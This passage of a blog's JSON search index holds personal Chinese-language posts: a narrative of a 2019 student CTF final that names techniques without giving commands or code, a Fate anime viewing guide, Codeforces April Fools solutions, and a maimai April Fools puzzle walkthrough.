","date":"2019-11-16","objectID":"/posts/2019/csc-final-experience/:0:0","tags":["CSC 金盾獎","日常閒聊"],"title":"[Sharing] 108年金盾獎決賽 麥當勞吃到飽 ฅ'ω'ฅ","uri":"/posts/2019/csc-final-experience/"},{"categories":["資訊安全 Cyber Security"],"content":"Date: 10/19 (Sat.) 南區的金盾初賽在崑山科大，還記得我們實驗室派了三隊出去。 一大早從鼓山車站一路搭區間車到台南，不知道是誰的主意Zzzz 同一天下午還有 MOPCON 以及 MOPCON Beengaged 醞釀之夜，想想那天行程滿滿真的累爆。 總之就是早早起床趕車，而且隊友 @cfhfelix 狀態不太好，所以我們學科 50 題寫完，五題的術科只有解出一題QQ （唯一解出來是 Web 的 SQL injection…） 我們隊長大黑黑 @stavhaygn 戳一戳 flg 就意外跑出來了（？） 雖然有聽說這屆初賽好像本來就比較難… 結果 嗯嗯 術科就這樣不採計囉 (ㆆᴗㆆ)! 而且，我們實驗室派出三隊只有我們晉級（!? 學科的功勞要給 @cfhfelix ，聽說他前陣子直接拿資安概論v3來啃 6666 放個決賽名單，包含國高中共 131 隊，大專校院取 34 隊晉級。 名單中另一個中山隊伍聽說是資管系，反正我第一次參加什麼人都不認識XD 然後看到滿滿的台清交其實就不太在意決賽排名了（欸）不過倒是很期待吃麥當當 ㄏㄏ ","date":"2019-11-16","objectID":"/posts/2019/csc-final-experience/:1:0","tags":["CSC 金盾獎","日常閒聊"],"title":"[Sharing] 108年金盾獎決賽 麥當勞吃到飽 ฅ'ω'ฅ","uri":"/posts/2019/csc-final-experience/"},{"categories":["資訊安全 Cyber Security"],"content":"Date: 11/15(Fri.) 金盾決賽在台北張榮發基金會國際會議中心，好險週五的必修書報討論暫停一次，否則再繼續欠出席真的有可能會 OUT … 我們一大早六點集合完直接從中山出發，輾轉高捷 ➜ 高鐵 ➜ 北捷，大約九點多抵達會場。 這次的題目範圍除了常見的 Reverse、Web、Pwn、Crypto、Misc，還多了關鍵基礎設施（CI）。 聽完說明後感覺 CI 題超酷der，貌似是今年金盾的新題型！ 再來是點心時間，不得不說這次競賽的待遇真的好棒（嚼 然後就是眾所期待的午餐時間！ 封面圖應該也看得出來www 聽說麥當當是金盾一直以來的傳統（？ 總之桌上的麥當當隨便拿，最搶手的應該 20 塊雞塊分享盒，數量不多真的搶爆，有趣的是我們一隊三人不小心搶了兩盒雞塊，趕快送掉一盒不然很怕被瞪XDDDD 噢對！還有這個…網路線轉接頭… 真的壓根沒想到官方提供的網路環境是實體 cable 而不是無線 WIFI，我們這隊三人的筆電都不能直接插網路線，也沒人想到要帶轉接頭… 只好趕緊去櫃檯押證件借了三條，不然差點就要看別人打競賽了XDDDDD 之後就是漫長的 5hr 正式賽～開打啦！ 首先，開放對外連網這件事對我來說蠻新奇的，畢竟之前打競程現場賽都是只能自備 codebook 的無網路環境。 但這也相對說明題目有可能複雜到 Google 半天都解不出來… 事實上也是如此QQ 即使找得到其他 CTF 的 Writeup 也不見得有相同的做法，要靠自己找方法解決（頭疼） 開場只開放 5 題：500 分 * 3、200 分 * 2 新手如我當然一題題點開慢慢看。 拿到的 ELF 能 file 、 strings 基本操作都先摸過一遍，拿到的 IP address 能猜 robot.txt 、 NMAP 、 F12大法 都盡量戳戳看 … 果然沒有像前陣子的 picoCTF 那麼簡單QQ 過不久聽 @stavhaygn 有挖到一題 IP 後綴 :8080/upload 有頁面可以上傳 .rar ，收到指示就開始找相關題型或是可以寫的 shell 包成 .rar。 ^^^大概就是這種感覺，對題目和各種名詞的熟悉度還是很生疏^^^ 大概過了 1hr，聽到 @stavhaygn 咂嘴解掉一題 Pwn (200)，但應該是太晚發現這題，原本的 200 分不知道掉到剩多少（詳見上圖注意事項） 另一位隊友 @cfhfelix 在戳 500 分的 PT，聽說還能透過內建通訊和其他隊伍聊天（？）但 Bug 之後好像被修掉了，在那之前拿到了一組假 Key 錯了一次QQ 1.5hr 過後，開放剩下 5 題：200分 * 1、300 分 * 4 我放棄研究 .rar 上傳那題，看過剩下 5 題後決定開始根據官方的提示解Crypto (500)。 查了一些相關的 Encryption，並且花了點時間用 C++ 試著對表寫了一支程式才解出來是一個目錄位址，把 IP + 目錄位址組裝連過去抓到一個 secret.zip 和 xxx.txt ，查了一陣子後知道是要用已知明文攻擊拆 .zip。 順帶一提 xxx.txt 裡頭是 bas64 編碼，剛好前一天的資安社社課有學到 base64 的特性，拿去線上轉換可以得到 .rar 內的加密方法（AES），但還是得想辦法拆.zip，於是聽了 @stavhaygn 的指示跑去研究 fcrack （途中還被 pkcrack 和 zip版本 雷到…工具不熟也是個大問題== 總之離競賽剩 1.5hr 時，我把參數設好放了 1hr 用 fcrack 爆破 .zip 還是沒成功QQ 反而是官方在剩下 2hr 吧，陸續公開了一些提示，我在想會不會是大家都解不出來XDDD 而在我解 Crypto 的期間， @cfhfelix 看媽祖那題看得很頭痛，事後聽官方題解真心覺得真的是浪費時間www 然後隊長 @stavhaygn 在剩下 30mins 靠著一條微妙的提示，當場和 @cfhfelix 研究 symbolic link 把上傳 .rar 那題解掉了！ 確定拿下兩題後，競賽也差不多結束了。 從上述文章可能看不太出來，實際情況是我們三人是交叉把每題翻過 Google找方法一直戳，還記得我自己的分頁開了整整一大排，算是在競賽中努力吸收新知識吧 : 3 然後是頒獎 \u0026 解題時間。 頒獎自然是沒我們的份兒，不過從嶄露頭角獎的隊伍成績來看，說不定再解一題就有機會拿錢了QQ 歐對、競賽期間的計分版只能在外面才看得到，這對競程出身的我來說還蠻不方便的… 然後關於各隊伍的解題狀況、每題的解出隊伍數也通通黑箱，所以到最後也不知道大家解的如何，但我敢肯定的是Web媽祖那題… 應該是沒有人解出來啦 (ΦωΦ) 解題的部分我有偷偷錄了下來，有興趣的可以去看看，真D精彩www ➜ https://youtu.be/PCcA9z6tO1k 晚餐 TIME! 繼續被餵食（嚼 不曉得是否因為政府主辦，感覺吃的都好棒 ε٩(๑\u003e ₃ \u003c)۶з 另外主辦單位還有送一件T-shirt和背包，免報名費還有紀念品可拿真D賺 =~= 最後… 我說那個聽起來很酷的 CI 題呢？？？ 嗯、真的從競賽結束 到 吃完晚餐，完全沒聽到官方提起這東西… 原本想說拿個一題去看看 CI 題也好，結果可能太晚解出第一題沒拿到 CI 題入場券QQ 嗚嗚 好想知道內容ㄛ… 千反田：我很好騎（大誤）。 ","date":"2019-11-16","objectID":"/posts/2019/csc-final-experience/:2:0","tags":["CSC 金盾獎","日常閒聊"],"title":"[Sharing] 108年金盾獎決賽 麥當勞吃到飽 ฅ'ω'ฅ","uri":"/posts/2019/csc-final-experience/"},{"categories":["休閒娛樂 ACGN"],"content":" 沒想到 TM 從 2000 年以來越做越大… 已經是需要說明書才能看懂的程度欸。 會寫到這篇的原因，是巴哈姆特這篇：RE:【問題】請問動畫目前有哪些種類? P.S. 原問題討論串已過時被刪除 嗯、沒錯，正是小弟不才我的回文 ٩(ˊᗜˋ*)و 這篇同時也被放在TYPE-MOON 巴哈版置頂區的某個角落，看看回文時間 2015 年轉眼也過了四年。基於巴哈系統會砍古文、加上這幾年來 Fate 系列很多衍生作品動畫化，趁暑假最後還有點空閒把至今為止的動畫整理一下，另外再簡單帶些 TYPE-MOON （以下簡稱 TM ）的世界觀。 標題雖然寫著《Fate系列》，但其實整個系列是被歸類在 TM 這個社團底下，所以 Fate 世界中有些橋段多多少少會和其他 TM 作品連動（月姬、空之境界、魔法使之夜），甚至在 TM 十週年的紀念動畫混了 Fate 系列一大堆角色梗XD ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:0:0","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate 本傳 簡單解釋一下《Fate》本傳。 最早《Fate/Stay Night》是以 R18 的 PC 文字冒險遊戲登場，故事根據對話選項主要以三條路線（世界線）作為結局，分別是 Fate線 （又稱 Saber 線）、UBW線（又稱凜線） 以及 HF 線（又稱櫻線），而動畫就是以這三條分別作為主軸，然後在劇情方面稍做修改。 上述《Fate/Stay Night》的故事背景是在冬木市第五次聖杯戰爭。 之後出現的《Fate/Zero》是第四次聖杯戰爭，也就是所謂的前傳！ 剛入坑的新人: Fate 系列這麼多，動畫該從哪裡開始看呢？ 原則上《Fate/Stay Night》三條世界線劇情互相不衝突，個人建議是照著開播順序慢慢追，一方面是畫風接受度的問題 （像我自己已經被ufotable的精美作畫養壞，回不去 2006 年的 F/SN 了） ，另一方面是有些橋段要先看過 F/SN 再看 Fate/Zero 才有辦法瞭解前後的心境轉變，以下依照開播時間列出來簡單點評。 Tip ✿ 以下動畫開播時間以\"季\"為單位，例如 “06冬” = 2006/1～2006/3，以此類推。 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:0","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Stay Night（Fate 線 / Saber 線）[ 06冬、06春 ] 全 24 話 動畫製作：Studio DEEN Fate 系列首次動畫化的作品，簡稱 06FSN 以 Fate 線為主軸，但內容提及一些 UBW 、 HF 線的內容 畫風和當今相比之下有相當大的落差，如果能接受再補吧 : \u003e ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:1","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Stay Night （UBW 線 / 凜線）[ 劇場版 (2010) ] 全 1 部 UBW 全名為 Unlimited Blade Works ，中文翻作「無限劍製」 由 Studio DEEN 動畫公司製作，所以有些人稱 Deen UBW 這部在作畫和劇情編排被濃縮導致評價上偏低，可自行斟酌觀看 2014 年 ufortable 動畫公司以同樣 UBW 線製作全 26 話動畫，基本上這部劇場版建議跳過 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:2","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Zero [ 11秋、12春 ] 全 24 話 簡稱 F/Z，即《Fate/Stay Night》前傳 aka 第四次聖杯戰爭 動畫製作為 ufotable 幽浮桌，品質保證 Fate 衍生作品《艾梅洛閣下 II 世事件簿》以 Fate/Zero 的其中一名角色韋伯作為主角 基本上 Fate/Zero 只有一條故事線，強推！ ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:3","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Stay Night （UBW 線 / 凜線）[ 14秋、15春 ] 全 26 話 和 2010 劇場版是同一條世界線，和前面區別會稱 UBW TV 版 由壯哉我大 ufotable 動畫公司負責，作畫非常精良，動作戲也十分亮眼，強推！ 如果無法接受前面 06FSN 或 2010 UBW 劇場版，可以從這部以及 F/Z 兩部入門，了解世界觀後再決定下一步 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:4","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Stay Night（HF 線 / 櫻線）[ 劇場版 (2017-2020) ] 全 3 部 HF 全名為 Heaven’s Feel ，中文翻作「天之杯」 劇情份量是三條世界線中最多、PC 遊戲中也是解謎重點（需解完 Saber 線和 UBW 線才能開啟的 HF 線） 劇場版分成三篇章播出 2017/10 《I. presage flower》（預示之花） 2019/01《II. lost butterfly》（迷途之蝶） 2020/08《III. spring song》（春櫻之歌） 劇情前期省略了蠻多細節，建議至少要補上面那部 2014 UBW 線，甚至再補個 Fate/Zero 才會更瞭解角色之間的關係。 ufotable 品質保證，那個戰鬥畫面配 4DX 真的讓我一直興奮發抖\u003e\u003c ， 強推！ ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:5","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"艾梅洛閣下 II 世事件簿 [ 19夏 ] 全 13 話 + EP.0 副標題為 -魔眼蒐集列車 Grace note- 故事背景為第四次聖杯戰爭（Fate/Zero）的十年後，以 Fate/Zero 角色韋伯作為主角 關於\"魔眼\"的設定可參考 TM 世界觀底下《空之境界》、《月姬》 分類上理應在外傳比較適當，但劇情中多次提及韋伯視角中 Fate/Zero 橋段，所以個人視為本傳延伸 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:1:6","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate 外傳 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:0","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/kaleid liner 魔法少女☆伊莉雅 系列 以 F/SN 中其中一名角色伊莉雅作為主角，由一位非常熱愛伊莉雅的畫家廣山弘 ，畫伊莉雅同人漫畫甚至出一堆動畫，我想這就是愛吧w 完全的平行世界，沿用 F/SN 的設定並追加一些奇怪的奇幻要素（欸） 目前共四季 + 1 部 OVA + 2 部劇場版 Fate/kaleid liner 魔法少女☆伊莉雅 [ 13夏 ] 全 10 話 Fate/kaleid liner 魔法少女☆伊莉雅 2wei! [ 14夏 ] 全 10 話 Fate/kaleid liner 魔法少女☆伊莉雅 2wei Herz! [ 15夏 ] 全 10 話 Fate/kaleid liner 魔法少女☆伊莉雅 3rei!! [ 16夏 ] 全 12 話 Fate/kaleid liner 魔法少女☆伊莉雅 雪下的誓言 [ 劇場版 (2017) ] Fate/kaleid liner 魔法少女☆伊莉雅 Prisma☆Phantasm (百變嘉年華) [ OVA (2019) ] Fate/kaleid liner 魔法少女☆伊莉雅 Licht 無名的少女 [ 劇場版 (2021) ] （2023/08 在伊莉雅動畫十週年活動公開了 Licht 續篇動畫消息） 簡單講，就是因為伊莉雅在本傳各種悲劇，所以生了一個和平的世界線給她（？） 廣山弘 @hiroshi_ ，於 2015 年 UBW-TV EP 15 放送後 今なら、なんで俺がプリズマ☆イリヤを描こうと思ったのか分かってくれる方が多いの ではないでしょうか。（現在大家應該理解我為什麼要畫魔法少女伊莉雅了吧） イリヤは死なないわ。私が（10年かけて）守るもの。（伊莉雅會永遠活下去，我花了10年時間來保護她呢。） ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:1","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Apocrypha [ 17夏、17秋 ] 全 25 話 簡稱 F/Ap 因為後面那個A很難念 原本是線上遊戲企劃（Fate Online Project）的廢案，後以小說（作者 東出祐一郎）形式出版 時間軸在第三次聖杯戰爭後，發生在其他地方的亞種聖杯戰爭 故事是兩派勢力各召喚七名從者的大混戰，動畫方面雖然負評不少，但我很喜歡！ 懷念這部在臺灣還沒什麼人討論時，我就已經在網路上靠翻譯啃完小說了www ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:2","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/Grand Order 傳說中的手遊 FGO（常駐課金排行榜），感謝各位乾爹讓我們有動畫可以看 ᕕ ( ᐛ ) ᕗ 單話動畫大部分出自每年年底的 Fate Project 大晦日 電視特別節目 目前 FGO 相關動畫： Fate/Grand Order -First Order- [ 長篇動畫 (2016) ] 全 1 話 Fate/Grand Order -MOONLIGHT/LOSTROOM- [ 短篇動畫 (2017) ] 全 1 話 Fate/Grand Order × 冰室的天地～7位最強偉人篇～ [ 長篇動畫 (2017) ] 全 1 話 第七特異點 絕對魔獸戰線巴比倫尼亞 [ 19秋 ] 全 21 話 + EP.0 第六特異點 神聖圓桌領域卡美洛 [ 劇場版 ] 全 2 話 2020/12 前篇「Wandering; Agateram（迷途者：銀色之腕）」 2021/05 後篇「Paladin; Agateram（聖騎士：銀色之腕）」 Fate/Grand Carnival [ OVA (2021) ] 全 2 話 風格和 TM 紀念動畫《幻想嘉年華 (2011)》相似 終局特異點 冠位時間神殿所羅門 [ 劇場版(2021) ] 全 1 話 Fate/Grand Order 藤丸立香不明白 [ 動畫短片 (2022-2023) ] 全 33 話 + 特別篇 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:3","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/EXTRA Last Encore [ 18冬 ] 全 13 話 作品來源為 PSP 遊戲 Fate/EXTRA (2010) ，後續還有 Fate/EXTRA CCC (2013) 以及 Fate/EXTELLA (2016) 繼承 F/SN 世界觀的新章，由 SHAFT 動畫公司製作 篇章以「Oblitus 地動說」以及 「Illustrius 天動說」分開放送 2020/07 TM 下屬工作室 Studio BB 宣布開始製作重製版「Fate/EXTRA Record」，但目前未有進一步消息 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:4","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"衛宮家今天的餐桌風景 [ 網路動畫 (2018-2019) ] 全 13 話 簡稱衛宮飯，動畫製作為 ufotable，在 2018 年以每個月一話的進度放送 基本上就是以 F/SN 為基礎改編，然後找一堆人吃飯的節目 aka 吃貨番 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:5","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"Fate/strange Fake [ 前導動畫 (2023) ] 全 1 話 副標題為 -Whispers of Dawn- ，由 A-1 Pictures 動畫公司製作 背景為第五次聖杯戰爭的數年後，在美國西部發生的虛偽聖杯戰爭 （2023/07 Aniplex 有預告會出 TV 動畫，期待！） ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:2:6","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"其他 TM 系列 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:3:0","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"真月譚 月姬 [ 03秋 ] 全 12 話 原作的 PC 遊戲《月姬》是在 2000 年的 C59 公布 （TM 成立的第一部作品） 動畫版由於篇幅被過度壓縮，以及監督的個人堅持，被月姬粉絲稱黑歷史、不存在的動畫 我自己是從這部動畫接觸月姬，覺得還可接受，之後也把漫畫版啃完 \\ 愛爾奎特 美如畫 / ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:3:1","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"空之境界 [ 劇場版 (2007-2011) ] 全 8 部 和《月姬》有共同的世界觀 劇場版分八個章節、各章節上映時間及標題如下 2007/12 第一章《俯瞰風景》 2007/12 第二章《殺人考察（前）》 2008/01 第三章《痛覺殘留》 2008/05 第四章《伽藍之洞》 2008/08 第五章《矛盾螺旋》 2008/12 第六章《忘卻錄音》 2009/08 第七章《殺人考察（後）》 2011/02 終章 《空之境界》 劇情有點玄、時間軸也不是正序表現， 老實講當年某幾部我還看到差點睡著 。 ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:3:2","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["休閒娛樂 ACGN"],"content":"幻想嘉年華 [ OVA (2011) ] 全 12 話 TM 十週年紀念動畫，劇情很有趣的，各種 TM 亂入和角色梗 基本上就是大雜燴，建議至少看過《Fate/Stay Night》和《月姬》才會比較懂梗 XD ","date":"2019-08-26","objectID":"/posts/2019/fate-anime-talk/:3:3","tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] 淺談《Fate系列》的世界觀（動畫篇）","uri":"/posts/2019/fate-anime-talk/"},{"categories":["程式設計 Programming"],"content":"聽說是 Codeforces 每年都會辦的愚人節活動，今次算是體驗到何謂無厘頭解謎XD 除了 pA 還算正常，其他都在玩猜猜樂（根本通靈大賽），賽後透過一些線索才把 pB, pC, pD 搞定，如果有任何錯誤也歡迎來信指教 \u003e\u003c ","date":"2019-04-02","objectID":"/posts/2019/codeforces-april-fools-day-2019/:0:0","tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/posts/2019/codeforces-april-fools-day-2019/"},{"categories":["程式設計 Programming"],"content":"Problem A - Thanos Sort 一種有趣的排序法，透過多次對半刪減直到剩下的序列是 OK 的才停止。 這題看計分板相當和平，我自己也是用遞迴慢慢跑就 AC 了w 應該算是出題者給大家牛刀小試用的吧~ ","date":"2019-04-02","objectID":"/posts/2019/codeforces-april-fools-day-2019/:1:0","tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/posts/2019/codeforces-april-fools-day-2019/"},{"categories":["程式設計 Programming"],"content":"Problem B - Kanban Numbers 題目短到可以不用點開連結XD 輸入 $a (1≤a≤99)$ ，輸出 “Yes” or “No” 。 計分板上各種猜，提交 100 餘次的不在話下，可惜我看到 pD 比較多人 AC 就沒花時間猜這題了。 而謎底就藏在題目… “kanban”，拿去估狗翻譯會得到\"看板\"的解釋，但實際上應該要拆成kan、ban。kan 本身無意，而 ban 有禁止的意味，答案就是「禁止kan」。嗯？？？ 嗯、就這樣。 其實在數字的英文拼音中並沒有出現 k 或是 a 的字母。 因此，你只要檢查輸入的數字在拼寫中是否出現 n 就行了XD 真的是不能用正常的思路解謎呢… ","date":"2019-04-02","objectID":"/posts/2019/codeforces-april-fools-day-2019/:2:0","tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/posts/2019/codeforces-april-fools-day-2019/"},{"categories":["程式設計 Programming"],"content":"Problem C - Mystery Circuit 題目給了很神秘的電路…然後要你輸入 $a (0≤a≤15)$ 、輸出整數，沒了。 老實說這題摸半天還是沒有頭緒，倒是友人在 Quirk 把電路拼起來丟 0101 測一測就發現答案了，莫名其妙XD 附上code，若非該領域的玩家應該都想不到吧… #include \u003ciostream\u003e using namespace std; int main(){ int n; cin \u003e\u003e n; int arr[] = {15, 14, 12, 13, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7}; cout \u003c\u003c arr[n] \u003c\u003c endl; return 0; } ","date":"2019-04-02","objectID":"/posts/2019/codeforces-april-fools-day-2019/:3:0","tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/posts/2019/codeforces-april-fools-day-2019/"},{"categories":["程式設計 Programming"],"content":"Problem D - Pigeon d’Or 讓我花最久的題目，老實說真的差一步就解出來了QQ 原本第一眼看題目還真的看不太懂，所以拿去餵狗翻譯… 嗯、還是看不懂呢，甚至還在懷疑是哪一國的語言，但大部分明明就是看得懂的英文啊QQ 後來從測資開始猜： 範測是給了五個數字、得到一個數字，而且輸入數字範圍還在 32 內，用往年經驗有可能是邏輯運算，而這種題目最常用的就是 XOR ，所以就想盡辦法用範測和 XOR 湊答案，也因此吃了好幾次 WA 、深信下一次交出去的肯定會 AC（並不會好嗎.jpg） 但到了後來卡關又把題目讀了幾次… 想到會不會是出題者故意寫錯字!? 從第一段的 “ftying rats” 感覺就應該是 “flying rats”，所以就想了幾個辦法測錯字。 最後是用 word 內建的拼字檢查，還真的不少錯字wwwww 英文超爛的我就開始慢慢對著把拼錯的字母抓出來… 然後競賽就結束了（幹 賽後解出來看到神奇的…單詞？ twoplusxorofthirdandminelements 簡單分析一下… two plus XOR of third and min elements (輸入的第三個數字) ^ (序列中最小值) + 2。 意外地前面有猜到 XOR，只是這解法真的想不到XDDD 如果有早點發現題目內的錯字 Bug，說不定就有機會即時解出來了qq 差不多就這樣、思考的過程真的蠻有趣的XD 畢竟沒給其他線索真的只能無厘頭隨便猜、看到丟破百次才 AC 都不會感到驚訝，反而覺得「居然猜到AC實在太神LA」 ","date":"2019-04-02","objectID":"/posts/2019/codeforces-april-fools-day-2019/:4:0","tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/posts/2019/codeforces-april-fools-day-2019/"},{"categories":["休閒娛樂 ACGN"],"content":" 又到了一年一度的愚人節呢，網路上不免俗地充斥著各種假新聞。 maimai 官方今年也照慣例推出愚人節限定曲，不過！這次多了解謎的彩蛋活動XD 為了避免有爆雷捏他嫌疑，我還特地等到 4/1 過了才發這篇呢www 這次 SEGA 旗下的三款音樂遊戲機台 maimai、CHUNITHM、オンゲキ 都有相對應的愚人節活動，只是無奈台灣只有 maimai 能玩，其餘兩台都是日本限定，殘念呀QQ 首先、放上愚人節我們解謎用的 youtube 外部出力影片，而謎題就在背景動畫中。 我想應該是怕太早捏他吧，直到 4/2 才逐漸有解謎取向的解說影片。 從上面可以看出，譜面相當… 混亂(?)。 也因為很多該點該滑的沒有處理，所以當時解謎真的是用0.25倍重播慢慢看（# 那麼 下面就來解謎囉!! w Note 以下圖片來源均參考 布魯諾 的外部出力、不得不說畫面真的處理得很好!! ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:0:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 \u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":["休閒娛樂 ACGN"],"content":"第一問、「本物を順番に読め」 翻成中文大約是「找出本尊並依照順序讀」，如影片所見就是一大堆粉色的tap、hold交雜。 有些是真的要按的，但其他的都是背景動畫亂入，實在… 非常討厭 XD 解謎方式是找出要按出來的 tap（本尊），如下圖所見。 可以看到最後一顆還把周圍的仮名拿走、超壞www 解出來的答案是「わからない」，捏他自maimai原創曲 分からない ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:1:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 \u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":["休閒娛樂 ACGN"],"content":"第二問、「正確になぞり出てくる金の文字を読め」 題意要我們注意的是「正確描繪出來的金色文字」，不得不說這題是我們卡關最久的。 我們嘗試把背景動畫出現的金色色塊抄起來，但完全沒有任何頭緒… 頂多可以猜到是仮名部分偏旁，然後天真地把五十音表拿出來開始各種亂猜XDDDD 解不出來就直接跳過了，直到剩下第五問需要這題的答案才又回來看，大概看了半小時、放棄。 最後看完網路上的題解真的傻眼www 原來所謂\"金色文字\"也包含slide滑完出現的Perfect，但我們解謎用的外部出力並沒有滑完(((# 剩下的解法就看下圖啦~ 真的各種想不到 最後一個字真的很壞 在slide的Perfect黃條結束才在背景動畫突然插進一個點…（還讓我不得不拆成兩張截圖w 解出來的答案是「トパゾライト」，捏他自作曲家 t+pazolite（這傢伙寫過不少可怕的BOSS曲）。 ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:2:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 \u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":["休閒娛樂 ACGN"],"content":"第三問、「同じ数字には同じ文字」 這題應該是我們寫最快的一題吧XDDD 題意大約是「把同樣的數字對應同樣的字母，然後把最後一句拼寫出來」。 要說難點的話… 那就是背景動畫很很很很很很、很晃，布魯諾桑處理出來的影片就清楚很多~ 把 maimai 的四種判定文字 Perfect、Great、Good、Miss 填入就結束了www 解出來的答案是「desperete(デスパレイト)」，捏他自 maimai 原創曲 デスパレイト。 ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:3:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 \u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":["休閒娛樂 ACGN"],"content":"第四問、「囲われた文字を数字の順に読め」 這題一開始我還看不懂題目（日文苦手），後來才簡單查了一下 題意是「把圍起來的文字照數字順序讀」… 簡單XD 解出來的答案是「せんたくき」，寫成漢字就是「洗濯機」 …應該不用另外解釋了吧www ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:4:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 